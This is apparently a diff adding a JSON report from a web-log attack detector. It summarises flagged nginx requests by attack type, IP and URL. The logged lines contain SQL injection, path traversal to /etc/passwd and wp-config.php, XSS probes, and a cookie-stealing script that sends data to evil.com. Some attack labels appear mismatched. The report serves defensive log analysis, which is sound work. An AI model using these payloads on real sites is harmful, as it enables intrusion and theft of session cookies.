@@ -1,0 +1,275 @@
+{
+  "summary": {
+    "total_lines": 12,
+    "attack_lines": 8,
+    "attack_rate": 66.66666666666666,
+    "unique_ips": 7,
+    "unique_urls": 8,
+    "attack_types": {
+      "file_upload_attack": 3,
+      "access_control_abuse": 3,
+      "path_traversal": 3,
+      "sql_injection": 2,
+      "xss_reflected_stored": 1
+    },
+    "start_time": "2026-04-01T20:14:27.553121",
+    "end_time": "2026-04-01T20:14:27.553121"
+  },
+  "attack_types": {
+    "file_upload_attack": 3,
+    "access_control_abuse": 3,
+    "path_traversal": 3,
+    "sql_injection": 2,
+    "xss_reflected_stored": 1
+  },
+  "top_ips": [
+    {
+      "ip": "45.155.205.233",
+      "total": 5,
+      "attacks": {
+        "path_traversal": 2,
+        "access_control_abuse": 2,
+        "file_upload_attack": 1
+      }
+    },
+    {
+      "ip": "10.0.0.50",
+      "total": 2,
+      "attacks": {
+        "sql_injection": 1,
+        "access_control_abuse": 1
+      }
+    },
+    {
+      "ip": "192.168.1.101",
+      "total": 1,
+      "attacks": {
+        "file_upload_attack": 1
+      }
+    },
+    {
+      "ip": "192.168.1.100",
+      "total": 1,
+      "attacks": {
+        "xss_reflected_stored": 1
+      }
+    },
+    {
+      "ip": "192.168.1.102",
+      "total": 1,
+      "attacks": {
+        "sql_injection": 1
+      }
+    },
+    {
+      "ip": "10.0.0.51",
+      "total": 1,
+      "attacks": {
+        "file_upload_attack": 1
+      }
+    },
+    {
+      "ip": "192.168.1.103",
+      "total": 1,
+      "attacks": {
+        "path_traversal": 1
+      }
+    }
+  ],
+  "top_urls": [
+    {
+      "url": "/wp-admin/admin-ajax.php?action=updraft_download_backup&file=../../../../wp-config.php",
+      "total": 3,
+      "attacks": {
+        "path_traversal": 1,
+        "file_upload_attack": 1,
+        "access_control_abuse": 1
+      }
+    },
+    {
+      "url": "/admin.php?id=1%20union%20select%201,2,3",
+      "total": 2,
+      "attacks": {
+        "sql_injection": 1,
+        "access_control_abuse": 1
+      }
+    },
+    {
+      "url": "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../etc/passwd",
+      "total": 2,
+      "attacks": {
+        "path_traversal": 1,
+        "access_control_abuse": 1
+      }
+    },
+    {
+      "url": "/login.php",
+      "total": 1,
+      "attacks": {
+        "file_upload_attack": 1
+      }
+    },
+    {
+      "url": "/search?q=<script>alert(1)</script>",
+      "total": 1,
+      "attacks": {
+        "xss_reflected_stored": 1
+      }
+    },
+    {
+      "url": "/products?id=1%20AND%20SLEEP(5)",
+      "total": 1,
+      "attacks": {
+        "sql_injection": 1
+      }
+    },
+    {
+      "url": "/comment.php",
+      "total": 1,
+      "attacks": {
+        "file_upload_attack": 1
+      }
+    },
+    {
+      "url": "/images/../../../../etc/passwd",
+      "total": 1,
+      "attacks": {
+        "path_traversal": 1
+      }
+    }
+  ],
+  "detailed_logs": [
+    {
+      "ip": "192.168.1.101",
+      "time": "09/Mar/2024:08:23:46 +0800",
+      "method": "POST",
+      "url": "/login.php",
+      "status": "302",
+      "size": "0",
+      "referer": "http://example.com",
+      "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
+      "raw_line": "192.168.1.101 - - [09/Mar/2024:08:23:46 +0800] \"POST /login.php HTTP/1.1\" 302 0 \"http://example.com\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)\"\n",
+      "type": "nginx",
+      "attacks": [
+        "file_upload_attack"
+      ],
+      "detected_at": "2026-04-01T20:14:27.553121"
+    },
+    {
+      "ip": "10.0.0.50",
+      "time": "09/Mar/2024:08:23:47 +0800",
+      "method": "GET",
+      "url": "/admin.php?id=1%20union%20select%201,2,3",
+      "status": "200",
+      "size": "5120",
+      "referer": "-",
+      "ua": "sqlmap/1.5",
+      "raw_line": "10.0.0.50 - - [09/Mar/2024:08:23:47 +0800] \"GET /admin.php?id=1%20union%20select%201,2,3 HTTP/1.1\" 200 5120 \"-\" \"sqlmap/1.5\"\n",
+      "type": "nginx",
+      "attacks": [
+        "sql_injection",
+        "access_control_abuse"
+      ],
+      "detected_at": "2026-04-01T20:14:27.553121"
+    },
+    {
+      "ip": "192.168.1.100",
+      "time": "09/Mar/2024:08:23:48 +0800",
+      "method": "GET",
+      "url": "/search?q=<script>alert(1)</script>",
+      "status": "200",
+      "size": "1024",
+      "referer": "-",
+      "ua": "Mozilla/5.0",
+      "raw_line": "192.168.1.100 - - [09/Mar/2024:08:23:48 +0800] \"GET /search?q=<script>alert(1)</script> HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"\n",
+      "type": "nginx",
+      "attacks": [
+        "xss_reflected_stored"
+      ],
+      "detected_at": "2026-04-01T20:14:27.553121"
+    },
+    {
+      "ip": "45.155.205.233",
+      "time": "09/Mar/2024:08:23:49 +0800",
+      "method": "GET",
+      "url": "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../etc/passwd",
+      "status": "403",
+      "size": "512",
+      "referer": "-",
+      "ua": "Mozilla/5.0",
+      "raw_line": "45.155.205.233 - - [09/Mar/2024:08:23:49 +0800] \"GET /wp-admin/admin-ajax.php?action=duplicator_download&file=../../../etc/passwd HTTP/1.1\" 403 512 \"-\" \"Mozilla/5.0\"\n",
+      "type": "nginx",
+      "attacks": [
+        "path_traversal",
+        "access_control_abuse"
+      ],
+      "detected_at": "2026-04-01T20:14:27.553121"
+    },
+    {
+      "ip": "192.168.1.102",
+      "time": "09/Mar/2024:08:23:50 +0800",
+      "method": "GET",
+      "url": "/products?id=1%20AND%20SLEEP(5)",
+      "status": "200",
+      "size": "2048",
+      "referer": "-",
+      "ua": "Mozilla/5.0",
+      "raw_line": "192.168.1.102 - - [09/Mar/2024:08:23:50 +0800] \"GET /products?id=1%20AND%20SLEEP(5) HTTP/1.1\" 200 2048 \"-\" \"Mozilla/5.0\"\n",
+      "type": "nginx",
+      "attacks": [
+        "sql_injection"
+      ],
+      "detected_at": "2026-04-01T20:14:27.553121"
+    },
+    {
+      "ip": "10.0.0.51",
+      "time": "09/Mar/2024:08:23:51 +0800",
+      "method": "POST",
+      "url": "/comment.php",
+      "status": "200",
+      "size": "768",
+      "referer": "http://example.com",
+      "ua": "Mozilla/5.0",
+      "raw_line": "10.0.0.51 - - [09/Mar/2024:08:23:51 +0800] \"POST /comment.php HTTP/1.1\" 200 768 \"http://example.com\" \"Mozilla/5.0\" \"comment=<script>fetch('http://evil.com?cookie='+document.cookie)</script>\"\n",
+      "type": "nginx",
+      "attacks": [
+        "file_upload_attack"
+      ],
+      "detected_at": "2026-04-01T20:14:27.553121"
+    },
+    {
+      "ip": "192.168.1.103",
+      "time": "09/Mar/2024:08:23:52 +0800",
+      "method": "GET",
+      "url": "/images/../../../../etc/passwd",
+      "status": "403",
+      "size": "256",
+      "referer": "-",
+      "ua": "Mozilla/5.0",
+      "raw_line": "192.168.1.103 - - [09/Mar/2024:08:23:52 +0800] \"GET /images/../../../../etc/passwd HTTP/1.1\" 403 256 \"-\" \"Mozilla/5.0\"\n",
+      "type": "nginx",
+      "attacks": [
+        "path_traversal"
+      ],
+      "detected_at": "2026-04-01T20:14:27.553121"
+    },
+    {
+      "ip": "45.155.205.233",
+      "time": "09/Mar/2024:08:23:55 +0800",
+      "method": "GET",
+      "url": "/wp-admin/admin-ajax.php?action=updraft_download_backup&file=../../../../wp-config.php",
+      "status": "403",
+      "size": "512",
+      "referer": "-",
+      "ua": "Mozilla/5.0",
+      "raw_line": "45.155.205.233 - - [09/Mar/2024:08:23:55 +0800] \"GET /wp-admin/admin-ajax.php?action=updraft_download_backup&file=../../../../wp-config.php HTTP/1.1\" 403 512 \"-\" \"Mozilla/5.0\"\n",
+      "type": "nginx",
+      "attacks": [
+        "path_traversal",
+        "file_upload_attack",
+        "access_control_abuse"
+      ],
+      "detected_at": "2026-04-01T20:14:27.553121"
+    }
+  ]
+}
